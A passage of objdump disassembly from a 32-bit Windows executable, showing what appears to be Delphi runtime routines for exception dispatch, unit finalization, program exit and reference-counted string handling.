  401624:	ff 15 0c e0 40 00    	call   *0x40e00c
  40162a:	c3                   	ret
  40162b:	90                   	nop
  40162c:	80 3d 0c d0 40 00 00 	cmpb   $0x0,0x40d00c
  401633:	74 17                	je     0x40164c
  401635:	50                   	push   %eax
  401636:	50                   	push   %eax
  401637:	52                   	push   %edx
  401638:	54                   	push   %esp
  401639:	6a 02                	push   $0x2
  40163b:	6a 00                	push   $0x0
  40163d:	68 e4 fa ed 0e       	push   $0xeedfae4
  401642:	ff 15 0c e0 40 00    	call   *0x40e00c
  401648:	83 c4 08             	add    $0x8,%esp
  40164b:	58                   	pop    %eax
  40164c:	c3                   	ret
  40164d:	8d 40 00             	lea    0x0(%eax),%eax
  401650:	54                   	push   %esp
  401651:	6a 01                	push   $0x1
  401653:	6a 00                	push   $0x0
  401655:	68 e0 fa ed 0e       	push   $0xeedfae0
  40165a:	ff 15 0c e0 40 00    	call   *0x40e00c
  401660:	83 c4 04             	add    $0x4,%esp
  401663:	58                   	pop    %eax
  401664:	c3                   	ret
  401665:	8d 40 00             	lea    0x0(%eax),%eax
  401668:	80 3d 0c d0 40 00 01 	cmpb   $0x1,0x40d00c
  40166f:	76 07                	jbe    0x401678
  401671:	50                   	push   %eax
  401672:	53                   	push   %ebx
  401673:	e9 d8 ff ff ff       	jmp    0x401650
  401678:	c3                   	ret
  401679:	8d 40 00             	lea    0x0(%eax),%eax
  40167c:	85 c9                	test   %ecx,%ecx
  40167e:	74 19                	je     0x401699
  401680:	8b 41 01             	mov    0x1(%ecx),%eax
  401683:	80 39 e9             	cmpb   $0xe9,(%ecx)
  401686:	74 0c                	je     0x401694
  401688:	80 39 eb             	cmpb   $0xeb,(%ecx)
  40168b:	75 0c                	jne    0x401699
  40168d:	0f be c0             	movsbl %al,%eax
  401690:	41                   	inc    %ecx
  401691:	41                   	inc    %ecx
  401692:	eb 03                	jmp    0x401697
  401694:	83 c1 05             	add    $0x5,%ecx
  401697:	01 c1                	add    %eax,%ecx
  401699:	c3                   	ret
  40169a:	8b c0                	mov    %eax,%eax
  40169c:	80 3d 0c d0 40 00 01 	cmpb   $0x1,0x40d00c
  4016a3:	76 1d                	jbe    0x4016c2
  4016a5:	50                   	push   %eax
  4016a6:	52                   	push   %edx
  4016a7:	51                   	push   %ecx
  4016a8:	e8 cf ff ff ff       	call   0x40167c
  4016ad:	51                   	push   %ecx
  4016ae:	54                   	push   %esp
  4016af:	6a 01                	push   $0x1
  4016b1:	6a 00                	push   $0x0
  4016b3:	68 e1 fa ed 0e       	push   $0xeedfae1
  4016b8:	ff 15 0c e0 40 00    	call   *0x40e00c
  4016be:	59                   	pop    %ecx
  4016bf:	59                   	pop    %ecx
  4016c0:	5a                   	pop    %edx
  4016c1:	58                   	pop    %eax
  4016c2:	c3                   	ret
  4016c3:	90                   	nop
  4016c4:	80 3d 0c d0 40 00 01 	cmpb   $0x1,0x40d00c
  4016cb:	76 12                	jbe    0x4016df
  4016cd:	52                   	push   %edx
  4016ce:	54                   	push   %esp
  4016cf:	6a 01                	push   $0x1
  4016d1:	6a 00                	push   $0x0
  4016d3:	68 e2 fa ed 0e       	push   $0xeedfae2
  4016d8:	ff 15 0c e0 40 00    	call   *0x40e00c
  4016de:	5a                   	pop    %edx
  4016df:	c3                   	ret
  4016e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4016e4:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  4016eb:	0f 85 13 01 00 00    	jne    0x401804
  4016f1:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  4016f7:	8b 50 18             	mov    0x18(%eax),%edx
  4016fa:	8b 48 14             	mov    0x14(%eax),%ecx
  4016fd:	74 6e                	je     0x40176d
  4016ff:	fc                   	cld
  401700:	e8 2f fd ff ff       	call   0x401434
  401705:	8b 15 08 e0 40 00    	mov    0x40e008,%edx
  40170b:	85 d2                	test   %edx,%edx
  40170d:	0f 84 f1 00 00 00    	je     0x401804
  401713:	ff d2                	call   *%edx
  401715:	85 c0                	test   %eax,%eax
  401717:	0f 84 e7 00 00 00    	je     0x401804
  40171d:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401721:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401725:	81 39 ce fa ef 0e    	cmpl   $0xeefface,(%ecx)
  40172b:	74 37                	je     0x401764
  40172d:	e8 fa fe ff ff       	call   0x40162c
  401732:	80 3d 10 d0 40 00 00 	cmpb   $0x0,0x40d010
  401739:	76 29                	jbe    0x401764
  40173b:	80 3d 0c d0 40 00 00 	cmpb   $0x0,0x40d00c
  401742:	77 20                	ja     0x401764
  401744:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  401748:	50                   	push   %eax
  401749:	51                   	push   %ecx
  40174a:	e8 8d f9 ff ff       	call   0x4010dc
  40174f:	83 f8 00             	cmp    $0x0,%eax
  401752:	58                   	pop    %eax
  401753:	0f 84 ab 00 00 00    	je     0x401804
  401759:	89 c2                	mov    %eax,%edx
  40175b:	8b 44 24 04          	mov    0x4(%esp),%eax
  40175f:	8b 48 0c             	mov    0xc(%eax),%ecx
  401762:	eb 30                	jmp    0x401794
  401764:	89 c2                	mov    %eax,%edx
  401766:	8b 44 24 04          	mov    0x4(%esp),%eax
  40176a:	8b 48 0c             	mov    0xc(%eax),%ecx
  40176d:	80 3d 10 d0 40 00 01 	cmpb   $0x1,0x40d010
  401774:	76 1e                	jbe    0x401794
  401776:	80 3d 0c d0 40 00 00 	cmpb   $0x0,0x40d00c
  40177d:	77 15                	ja     0x401794
  40177f:	50                   	push   %eax
  401780:	8d 44 24 08          	lea    0x8(%esp),%eax
  401784:	52                   	push   %edx
  401785:	51                   	push   %ecx
  401786:	50                   	push   %eax
  401787:	e8 50 f9 ff ff       	call   0x4010dc
  40178c:	83 f8 00             	cmp    $0x0,%eax
  40178f:	59                   	pop    %ecx
  401790:	5a                   	pop    %edx
  401791:	58                   	pop    %eax
  401792:	74 70                	je     0x401804
  401794:	83 48 04 02          	orl    $0x2,0x4(%eax)
  401798:	53                   	push   %ebx
  401799:	31 db                	xor    %ebx,%ebx
  40179b:	56                   	push   %esi
  40179c:	57                   	push   %edi
  40179d:	55                   	push   %ebp
  40179e:	64 8b 1b             	mov    %fs:(%ebx),%ebx
  4017a1:	53                   	push   %ebx
  4017a2:	50                   	push   %eax
  4017a3:	52                   	push   %edx
  4017a4:	51                   	push   %ecx
  4017a5:	8b 54 24 28          	mov    0x28(%esp),%edx
  4017a9:	6a 00                	push   $0x0
  4017ab:	50                   	push   %eax
  4017ac:	68 b8 17 40 00       	push   $0x4017b8
  4017b1:	52                   	push   %edx
  4017b2:	ff 15 10 e0 40 00    	call   *0x40e010
  4017b8:	8b 7c 24 28          	mov    0x28(%esp),%edi
  4017bc:	e8 0b 1c 00 00       	call   0x4033cc
  4017c1:	ff b0 00 00 00 00    	push   0x0(%eax)
  4017c7:	89 a0 00 00 00 00    	mov    %esp,0x0(%eax)
  4017cd:	8b 6f 08             	mov    0x8(%edi),%ebp
  4017d0:	8b 5f 04             	mov    0x4(%edi),%ebx
  4017d3:	c7 47 04 e4 17 40 00 	movl   $0x4017e4,0x4(%edi)
  4017da:	83 c3 05             	add    $0x5,%ebx
  4017dd:	e8 86 fe ff ff       	call   0x401668
  4017e2:	ff e3                	jmp    *%ebx
  4017e4:	e9 23 00 00 00       	jmp    0x40180c
  4017e9:	e8 de 1b 00 00       	call   0x4033cc
  4017ee:	8b 88 00 00 00 00    	mov    0x0(%eax),%ecx
  4017f4:	8b 11                	mov    (%ecx),%edx
  4017f6:	89 90 00 00 00 00    	mov    %edx,0x0(%eax)
  4017fc:	8b 41 08             	mov    0x8(%ecx),%eax
  4017ff:	e9 a4 fc ff ff       	jmp    0x4014a8
  401804:	b8 01 00 00 00       	mov    $0x1,%eax
  401809:	c3                   	ret
  40180a:	8b c0                	mov    %eax,%eax
  40180c:	8b 44 24 04          	mov    0x4(%esp),%eax
  401810:	8b 54 24 08          	mov    0x8(%esp),%edx
  401814:	f7 40 04 06 00 00 00 	testl  $0x6,0x4(%eax)
  40181b:	74 1f                	je     0x40183c
  40181d:	8b 4a 04             	mov    0x4(%edx),%ecx
  401820:	c7 42 04 3c 18 40 00 	movl   $0x40183c,0x4(%edx)
  401827:	53                   	push   %ebx
  401828:	56                   	push   %esi
  401829:	57                   	push   %edi
  40182a:	55                   	push   %ebp
  40182b:	8b 6a 08             	mov    0x8(%edx),%ebp
  40182e:	83 c1 05             	add    $0x5,%ecx
  401831:	e8 66 fe ff ff       	call   0x40169c
  401836:	ff d1                	call   *%ecx
  401838:	5d                   	pop    %ebp
  401839:	5f                   	pop    %edi
  40183a:	5e                   	pop    %esi
  40183b:	5b                   	pop    %ebx
  40183c:	b8 01 00 00 00       	mov    $0x1,%eax
  401841:	c3                   	ret
  401842:	8b c0                	mov    %eax,%eax
  401844:	8b 44 24 30          	mov    0x30(%esp),%eax
  401848:	c7 40 04 8f 18 40 00 	movl   $0x40188f,0x4(%eax)
  40184f:	e8 78 1b 00 00       	call   0x4033cc
  401854:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  40185a:	8b 0a                	mov    (%edx),%ecx
  40185c:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  401862:	8b 42 0c             	mov    0xc(%edx),%eax
  401865:	83 60 04 fd          	andl   $0xfffffffd,0x4(%eax)
  401869:	81 38 de fa ed 0e    	cmpl   $0xeedfade,(%eax)
  40186f:	74 0d                	je     0x40187e
  401871:	8b 42 08             	mov    0x8(%edx),%eax
  401874:	e8 2f fc ff ff       	call   0x4014a8
  401879:	e8 92 fd ff ff       	call   0x401610
  40187e:	31 c0                	xor    %eax,%eax
  401880:	83 c4 14             	add    $0x14,%esp
  401883:	64 8b 10             	mov    %fs:(%eax),%edx
  401886:	59                   	pop    %ecx
  401887:	8b 12                	mov    (%edx),%edx
  401889:	89 11                	mov    %edx,(%ecx)
  40188b:	5d                   	pop    %ebp
  40188c:	5f                   	pop    %edi
  40188d:	5e                   	pop    %esi
  40188e:	5b                   	pop    %ebx
  40188f:	b8 01 00 00 00       	mov    $0x1,%eax
  401894:	c3                   	ret
  401895:	8d 40 00             	lea    0x0(%eax),%eax
  401898:	e8 2f 1b 00 00       	call   0x4033cc
  40189d:	8b 90 00 00 00 00    	mov    0x0(%eax),%edx
  4018a3:	8b 0a                	mov    (%edx),%ecx
  4018a5:	89 88 00 00 00 00    	mov    %ecx,0x0(%eax)
  4018ab:	8b 42 08             	mov    0x8(%edx),%eax
  4018ae:	e8 f5 fb ff ff       	call   0x4014a8
  4018b3:	5a                   	pop    %edx
  4018b4:	8b 64 24 2c          	mov    0x2c(%esp),%esp
  4018b8:	31 c0                	xor    %eax,%eax
  4018ba:	59                   	pop    %ecx
  4018bb:	64 89 08             	mov    %ecx,%fs:(%eax)
  4018be:	58                   	pop    %eax
  4018bf:	5d                   	pop    %ebp
  4018c0:	e8 ff fd ff ff       	call   0x4016c4
  4018c5:	ff e2                	jmp    *%edx
  4018c7:	c3                   	ret
  4018c8:	53                   	push   %ebx
  4018c9:	56                   	push   %esi
  4018ca:	57                   	push   %edi
  4018cb:	55                   	push   %ebp
  4018cc:	bf 94 e5 40 00       	mov    $0x40e594,%edi
  4018d1:	8b 47 08             	mov    0x8(%edi),%eax
  4018d4:	85 c0                	test   %eax,%eax
  4018d6:	74 1e                	je     0x4018f6
  4018d8:	8b 5f 0c             	mov    0xc(%edi),%ebx
  4018db:	8b 70 04             	mov    0x4(%eax),%esi
  4018de:	85 db                	test   %ebx,%ebx
  4018e0:	7e 14                	jle    0x4018f6
  4018e2:	4b                   	dec    %ebx
  4018e3:	89 5f 0c             	mov    %ebx,0xc(%edi)
  4018e6:	8b 44 de 04          	mov    0x4(%esi,%ebx,8),%eax
  4018ea:	85 c0                	test   %eax,%eax
  4018ec:	74 04                	je     0x4018f2
  4018ee:	8b e8                	mov    %eax,%ebp
  4018f0:	ff d5                	call   *%ebp
  4018f2:	85 db                	test   %ebx,%ebx
  4018f4:	7f ec                	jg     0x4018e2
  4018f6:	5d                   	pop    %ebp
  4018f7:	5f                   	pop    %edi
  4018f8:	5e                   	pop    %esi
  4018f9:	5b                   	pop    %ebx
  4018fa:	c3                   	ret
  4018fb:	90                   	nop
  4018fc:	53                   	push   %ebx
  4018fd:	56                   	push   %esi
  4018fe:	57                   	push   %edi
  4018ff:	55                   	push   %ebp
  401900:	8b f9                	mov    %ecx,%edi
  401902:	8b ea                	mov    %edx,%ebp
  401904:	8b f0                	mov    %eax,%esi
  401906:	b8 fc 18 40 00       	mov    $0x4018fc,%eax
  40190b:	3b 05 2c d0 40 00    	cmp    0x40d02c,%eax
  401911:	0f 94 c3             	sete   %bl
  401914:	3b fd                	cmp    %ebp,%edi
  401916:	7e 33                	jle    0x40194b
  401918:	8b 04 ee             	mov    (%esi,%ebp,8),%eax
  40191b:	45                   	inc    %ebp
  40191c:	89 2d a0 e5 40 00    	mov    %ebp,0x40e5a0
  401922:	85 c0                	test   %eax,%eax
  401924:	74 02                	je     0x401928
  401926:	ff d0                	call   *%eax
  401928:	84 db                	test   %bl,%bl
  40192a:	74 1b                	je     0x401947
  40192c:	b8 fc 18 40 00       	mov    $0x4018fc,%eax
  401931:	3b 05 2c d0 40 00    	cmp    0x40d02c,%eax
  401937:	74 0e                	je     0x401947
  401939:	8b cf                	mov    %edi,%ecx
  40193b:	8b d5                	mov    %ebp,%edx
  40193d:	8b c6                	mov    %esi,%eax
  40193f:	ff 15 2c d0 40 00    	call   *0x40d02c
  401945:	eb 04                	jmp    0x40194b
  401947:	3b fd                	cmp    %ebp,%edi
  401949:	7f cd                	jg     0x401918
  40194b:	5d                   	pop    %ebp
  40194c:	5f                   	pop    %edi
  40194d:	5e                   	pop    %esi
  40194e:	5b                   	pop    %ebx
  40194f:	c3                   	ret
  401950:	a1 9c e5 40 00       	mov    0x40e59c,%eax
  401955:	85 c0                	test   %eax,%eax
  401957:	74 0f                	je     0x401968
  401959:	8b 10                	mov    (%eax),%edx
  40195b:	33 c9                	xor    %ecx,%ecx
  40195d:	8b 40 04             	mov    0x4(%eax),%eax
  401960:	87 ca                	xchg   %ecx,%edx
  401962:	ff 15 2c d0 40 00    	call   *0x40d02c
  401968:	c3                   	ret
  401969:	8d 40 00             	lea    0x0(%eax),%eax
  40196c:	c7 05 0c e0 40 00 cc 	movl   $0x4010cc,0x40e00c
  401973:	10 40 00 
  401976:	c7 05 10 e0 40 00 d4 	movl   $0x4010d4,0x40e010
  40197d:	10 40 00 
  401980:	a3 9c e5 40 00       	mov    %eax,0x40e59c
  401985:	33 c0                	xor    %eax,%eax
  401987:	a3 a0 e5 40 00       	mov    %eax,0x40e5a0
  40198c:	89 15 a4 e5 40 00    	mov    %edx,0x40e5a4
  401992:	8b 42 04             	mov    0x4(%edx),%eax
  401995:	a3 18 e0 40 00       	mov    %eax,0x40e018
  40199a:	c6 05 20 e0 40 00 00 	movb   $0x0,0x40e020
  4019a1:	e8 aa ff ff ff       	call   0x401950
  4019a6:	c3                   	ret
  4019a7:	90                   	nop
  4019a8:	31 c0                	xor    %eax,%eax
  4019aa:	87 05 00 d0 40 00    	xchg   %eax,0x40d000
  4019b0:	f7 d8                	neg    %eax
  4019b2:	19 c0                	sbb    %eax,%eax
  4019b4:	40                   	inc    %eax
  4019b5:	bf 94 e5 40 00       	mov    $0x40e594,%edi
  4019ba:	8b 5f 18             	mov    0x18(%edi),%ebx
  4019bd:	8b 6f 14             	mov    0x14(%edi),%ebp
  4019c0:	ff 77 1c             	push   0x1c(%edi)
  4019c3:	ff 77 20             	push   0x20(%edi)
  4019c6:	8b 37                	mov    (%edi),%esi
  4019c8:	b9 0b 00 00 00       	mov    $0xb,%ecx
  4019cd:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4019cf:	5f                   	pop    %edi
  4019d0:	5e                   	pop    %esi
  4019d1:	c9                   	leave
  4019d2:	c2 0c 00             	ret    $0xc
  4019d5:	c3                   	ret
  4019d6:	8b c0                	mov    %eax,%eax
  4019d8:	53                   	push   %ebx
  4019d9:	56                   	push   %esi
  4019da:	57                   	push   %edi
  4019db:	55                   	push   %ebp
  4019dc:	bb 94 e5 40 00       	mov    $0x40e594,%ebx
  4019e1:	be 00 d0 40 00       	mov    $0x40d000,%esi
  4019e6:	bf 24 e0 40 00       	mov    $0x40e024,%edi
  4019eb:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  4019ef:	75 16                	jne    0x401a07
  4019f1:	83 3f 00             	cmpl   $0x0,(%edi)
  4019f4:	74 11                	je     0x401a07
  4019f6:	8b 17                	mov    (%edi),%edx
  4019f8:	89 d0                	mov    %edx,%eax
  4019fa:	33 d2                	xor    %edx,%edx
  4019fc:	89 17                	mov    %edx,(%edi)
  4019fe:	8b e8                	mov    %eax,%ebp
  401a00:	ff d5                	call   *%ebp
  401a02:	83 3f 00             	cmpl   $0x0,(%edi)
  401a05:	75 ef                	jne    0x4019f6
  401a07:	83 3d 04 d0 40 00 00 	cmpl   $0x0,0x40d004
  401a0e:	74 06                	je     0x401a16
  401a10:	ff 15 68 d0 40 00    	call   *0x40d068
  401a16:	80 7b 28 02          	cmpb   $0x2,0x28(%ebx)
  401a1a:	75 0a                	jne    0x401a26
  401a1c:	83 3e 00             	cmpl   $0x0,(%esi)
  401a1f:	75 05                	jne    0x401a26
  401a21:	33 c0                	xor    %eax,%eax
  401a23:	89 43 0c             	mov    %eax,0xc(%ebx)
  401a26:	ff 15 30 d0 40 00    	call   *0x40d030
  401a2c:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  401a30:	76 05                	jbe    0x401a37
  401a32:	83 3e 00             	cmpl   $0x0,(%esi)
  401a35:	74 22                	je     0x401a59
  401a37:	8b 43 10             	mov    0x10(%ebx),%eax
  401a3a:	85 c0                	test   %eax,%eax
  401a3c:	74 1b                	je     0x401a59
  401a3e:	ff 15 1c d0 40 00    	call   *0x40d01c
  401a44:	8b 53 10             	mov    0x10(%ebx),%edx
  401a47:	8b 42 10             	mov    0x10(%edx),%eax
  401a4a:	3b 42 04             	cmp    0x4(%edx),%eax
  401a4d:	74 0a                	je     0x401a59
  401a4f:	85 c0                	test   %eax,%eax
  401a51:	74 06                	je     0x401a59
  401a53:	50                   	push   %eax
  401a54:	e8 3b f6 ff ff       	call   0x401094
  401a59:	ff 15 34 d0 40 00    	call   *0x40d034
  401a5f:	80 7b 28 01          	cmpb   $0x1,0x28(%ebx)
  401a63:	75 03                	jne    0x401a68
  401a65:	ff 53 24             	call   *0x24(%ebx)
  401a68:	80 7b 28 00          	cmpb   $0x0,0x28(%ebx)
  401a6c:	74 05                	je     0x401a73
  401a6e:	e8 35 ff ff ff       	call   0x4019a8
  401a73:	83 3b 00             	cmpl   $0x0,(%ebx)
  401a76:	75 17                	jne    0x401a8f
  401a78:	83 3d 14 e0 40 00 00 	cmpl   $0x0,0x40e014
  401a7f:	74 06                	je     0x401a87
  401a81:	ff 15 14 e0 40 00    	call   *0x40e014
  401a87:	8b 06                	mov    (%esi),%eax
  401a89:	50                   	push   %eax
  401a8a:	e8 5d f6 ff ff       	call   0x4010ec
  401a8f:	8b 03                	mov    (%ebx),%eax
  401a91:	56                   	push   %esi
  401a92:	8b f0                	mov    %eax,%esi
  401a94:	8b fb                	mov    %ebx,%edi
  401a96:	b9 0b 00 00 00       	mov    $0xb,%ecx
  401a9b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401a9d:	5e                   	pop    %esi
  401a9e:	e9 73 ff ff ff       	jmp    0x401a16
  401aa3:	5d                   	pop    %ebp
  401aa4:	5f                   	pop    %edi
  401aa5:	5e                   	pop    %esi
  401aa6:	5b                   	pop    %ebx
  401aa7:	c3                   	ret
  401aa8:	a3 00 d0 40 00       	mov    %eax,0x40d000
  401aad:	e8 26 ff ff ff       	call   0x4019d8
  401ab2:	c3                   	ret
  401ab3:	90                   	nop
  401ab4:	8f 05 04 d0 40 00    	pop    0x40d004
  401aba:	e9 e9 ff ff ff       	jmp    0x401aa8
  401abf:	c3                   	ret
  401ac0:	8b 10                	mov    (%eax),%edx
  401ac2:	85 d2                	test   %edx,%edx
  401ac4:	74 1b                	je     0x401ae1
  401ac6:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401acc:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401acf:	49                   	dec    %ecx
  401ad0:	7c 0f                	jl     0x401ae1
  401ad2:	ff 4a f8             	decl   -0x8(%edx)
  401ad5:	75 0a                	jne    0x401ae1
  401ad7:	50                   	push   %eax
  401ad8:	8d 42 f8             	lea    -0x8(%edx),%eax
  401adb:	e8 ac f6 ff ff       	call   0x40118c
  401ae0:	58                   	pop    %eax
  401ae1:	c3                   	ret
  401ae2:	8b c0                	mov    %eax,%eax
  401ae4:	53                   	push   %ebx
  401ae5:	56                   	push   %esi
  401ae6:	89 c3                	mov    %eax,%ebx
  401ae8:	89 d6                	mov    %edx,%esi
  401aea:	8b 13                	mov    (%ebx),%edx
  401aec:	85 d2                	test   %edx,%edx
  401aee:	74 19                	je     0x401b09
  401af0:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401af6:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401af9:	49                   	dec    %ecx
  401afa:	7c 0d                	jl     0x401b09
  401afc:	ff 4a f8             	decl   -0x8(%edx)
  401aff:	75 08                	jne    0x401b09
  401b01:	8d 42 f8             	lea    -0x8(%edx),%eax
  401b04:	e8 83 f6 ff ff       	call   0x40118c
  401b09:	83 c3 04             	add    $0x4,%ebx
  401b0c:	4e                   	dec    %esi
  401b0d:	75 db                	jne    0x401aea
  401b0f:	5e                   	pop    %esi
  401b10:	5b                   	pop    %ebx
  401b11:	c3                   	ret
  401b12:	8b c0                	mov    %eax,%eax
  401b14:	85 d2                	test   %edx,%edx
  401b16:	74 23                	je     0x401b3b
  401b18:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401b1b:	41                   	inc    %ecx
  401b1c:	7f 1a                	jg     0x401b38
  401b1e:	50                   	push   %eax
  401b1f:	52                   	push   %edx
  401b20:	8b 42 fc             	mov    -0x4(%edx),%eax
  401b23:	e8 58 00 00 00       	call   0x401b80
  401b28:	89 c2                	mov    %eax,%edx
  401b2a:	58                   	pop    %eax
  401b2b:	52                   	push   %edx
  401b2c:	8b 48 fc             	mov    -0x4(%eax),%ecx
  401b2f:	e8 24 f7 ff ff       	call   0x401258
  401b34:	5a                   	pop    %edx
  401b35:	58                   	pop    %eax
  401b36:	eb 03                	jmp    0x401b3b
  401b38:	ff 42 f8             	incl   -0x8(%edx)
  401b3b:	87 10                	xchg   %edx,(%eax)
  401b3d:	85 d2                	test   %edx,%edx
  401b3f:	74 13                	je     0x401b54
  401b41:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401b44:	49                   	dec    %ecx
  401b45:	7c 0d                	jl     0x401b54
  401b47:	ff 4a f8             	decl   -0x8(%edx)
  401b4a:	75 08                	jne    0x401b54
  401b4c:	8d 42 f8             	lea    -0x8(%edx),%eax
  401b4f:	e8 38 f6 ff ff       	call   0x40118c
  401b54:	c3                   	ret
  401b55:	8d 40 00             	lea    0x0(%eax),%eax
  401b58:	85 d2                	test   %edx,%edx
  401b5a:	74 09                	je     0x401b65
  401b5c:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401b5f:	41                   	inc    %ecx
  401b60:	7e 03                	jle    0x401b65
  401b62:	ff 42 f8             	incl   -0x8(%edx)
  401b65:	87 10                	xchg   %edx,(%eax)
  401b67:	85 d2                	test   %edx,%edx
  401b69:	74 13                	je     0x401b7e
  401b6b:	8b 4a f8             	mov    -0x8(%edx),%ecx
  401b6e:	49                   	dec    %ecx
  401b6f:	7c 0d                	jl     0x401b7e
  401b71:	ff 4a f8             	decl   -0x8(%edx)
  401b74:	75 08                	jne    0x401b7e
  401b76:	8d 42 f8             	lea    -0x8(%edx),%eax
  401b79:	e8 0e f6 ff ff       	call   0x40118c
  401b7e:	c3                   	ret
  401b7f:	90                   	nop
  401b80:	85 c0                	test   %eax,%eax
  401b82:	7e 24                	jle    0x401ba8
  401b84:	50                   	push   %eax
  401b85:	83 c0 0a             	add    $0xa,%eax
  401b88:	83 e0 fe             	and    $0xfffffffe,%eax
  401b8b:	50                   	push   %eax
  401b8c:	e8 e3 f5 ff ff       	call   0x401174
  401b91:	5a                   	pop    %edx
  401b92:	66 c7 44 02 fe 00 00 	movw   $0x0,-0x2(%edx,%eax,1)
  401b99:	83 c0 08             	add    $0x8,%eax
  401b9c:	5a                   	pop    %edx
  401b9d:	89 50 fc             	mov    %edx,-0x4(%eax)
  401ba0:	c7 40 f8 01 00 00 00 	movl   $0x1,-0x8(%eax)
  401ba7:	c3                   	ret
  401ba8:	31 c0                	xor    %eax,%eax
  401baa:	c3                   	ret
  401bab:	90                   	nop
  401bac:	53                   	push   %ebx
  401bad:	56                   	push   %esi
  401bae:	57                   	push   %edi
  401baf:	89 c3                	mov    %eax,%ebx
  401bb1:	89 d6                	mov    %edx,%esi
  401bb3:	89 cf                	mov    %ecx,%edi
  401bb5:	89 f8                	mov    %edi,%eax
  401bb7:	e8 c4 ff ff ff       	call   0x401b80
  401bbc:	89 f9                	mov    %edi,%ecx
  401bbe:	89 c7                	mov    %eax,%edi
  401bc0:	85 f6                	test   %esi,%esi
  401bc2:	74 09                	je     0x401bcd
  401bc4:	89 c2                	mov    %eax,%edx
  401bc6:	89 f0                	mov    %esi,%eax
  401bc8:	e8 8b f6 ff ff       	call   0x401258
  401bcd:	89 d8                	mov    %ebx,%eax
  401bcf:	e8 ec fe ff ff       	call   0x401ac0
  401bd4:	89 3b                	mov    %edi,(%ebx)
  401bd6:	5f                   	pop    %edi
  401bd7:	5e                   	pop    %esi
  401bd8:	5b                   	pop    %ebx
  401bd9:	c3                   	ret
  401bda:	8b c0                	mov    %eax,%eax
  401bdc:	55                   	push   %ebp
  401bdd:	8b ec                	mov    %esp,%ebp
  401bdf:	6a 00                	push   $0x0
  401be1:	6a 00                	push   $0x0
  401be3:	52                   	push   %edx
  401be4:	50                   	push   %eax
  401be5:	8b 45 08             	mov    0x8(%ebp),%eax
  401be8:	50                   	push   %eax
  401be9:	51                   	push   %ecx
  401bea:	6a 00                	push   $0x0
  401bec:	6a 00                	push   $0x0
  401bee:	e8 09 f5 ff ff       	call   0x4010fc
  401bf3:	5d                   	pop    %ebp
  401bf4:	c2 04 00             	ret    $0x4
  401bf7:	90                   	nop
  401bf8:	55                   	push   %ebp
  401bf9:	8b ec                	mov    %esp,%ebp
  401bfb:	52                   	push   %edx
  401bfc:	50                   	push   %eax
  401bfd:	8b 45 08             	mov    0x8(%ebp),%eax
  401c00:	50                   	push   %eax
  401c01:	51                   	push   %ecx
  401c02:	6a 00                	push   $0x0
  401c04:	6a 00                	push   $0x0
  401c06:	e8 e9 f4 ff ff       	call   0x4010f4
  401c0b:	5d                   	pop    %ebp
  401c0c:	c2 04 00             	ret    $0x4
  401c0f:	90                   	nop
  401c10:	53                   	push   %ebx
  401c11:	56                   	push   %esi
  401c12:	57                   	push   %edi
  401c13:	55                   	push   %ebp
  401c14:	81 c4 04 f0 ff ff    	add    $0xfffff004,%esp
  401c1a:	50                   	push   %eax
  401c1b:	83 c4 fc             	add    $0xfffffffc,%esp
  401c1e:	8b f1                	mov    %ecx,%esi
  401c20:	89 14 24             	mov    %edx,(%esp)
  401c23:	8b f8                	mov    %eax,%edi
  401c25:	85 f6                	test   %esi,%esi
  401c27:	7f 09                	jg     0x401c32
  401c29:	8b c7                	mov    %edi,%eax
  401c2b:	e8 90 fe ff ff       	call   0x401ac0
  401c30:	eb 5f                	jmp    0x401c91
  401c32:	8d 6e 01             	lea    0x1(%esi),%ebp
  401c35:	81 fd ff 07 00 00    	cmp    $0x7ff,%ebp
  401c3b:	7d 28                	jge    0x401c65
  401c3d:	56                   	push   %esi
  401c3e:	8d 44 24 08          	lea    0x8(%esp),%eax
  401c42:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401c46:	ba ff 0f 00 00       	mov    $0xfff,%edx
  401c4b:	e8 8c ff ff ff       	call   0x401bdc
  401c50:	8b d8                	mov    %eax,%ebx
  401c52:	85 db                	test   %ebx,%ebx
  401c54:	7c 0f                	jl     0x401c65
  401c56:	8d 54 24 04          	lea    0x4(%esp),%edx
  401c5a:	8b c7                	mov    %edi,%eax
  401c5c:	8b cb                	mov    %ebx,%ecx
  401c5e:	e8 49 ff ff ff       	call   0x401bac
  401c63:	eb 2c                	jmp    0x401c91
  401c65:	8b dd                	mov    %ebp,%ebx
  401c67:	03 db                	add    %ebx,%ebx
  401c69:	8b c7                	mov    %edi,%eax
  401c6b:	8b d3                	mov    %ebx,%edx
  401c6d:	e8 02 04 00 00       	call   0x402074
  401c72:	56                   	push   %esi
  401c73:	8b 07                	mov    (%edi),%eax
  401c75:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401c79:	8b d3                	mov    %ebx,%edx
  401c7b:	e8 5c ff ff ff       	call   0x401bdc
  401c80:	8b d8                	mov    %eax,%ebx
  401c82:	85 db                	test   %ebx,%ebx
  401c84:	7d 02                	jge    0x401c88
  401c86:	33 db                	xor    %ebx,%ebx
  401c88:	8b c7                	mov    %edi,%eax
  401c8a:	8b d3                	mov    %ebx,%edx
  401c8c:	e8 e3 03 00 00       	call   0x402074
  401c91:	81 c4 04 10 00 00    	add    $0x1004,%esp
  401c97:	5d                   	pop    %ebp
  401c98:	5f                   	pop    %edi
  401c99:	5e                   	pop    %esi
  401c9a:	5b                   	pop    %ebx
  401c9b:	c3                   	ret
  401c9c:	52                   	push   %edx
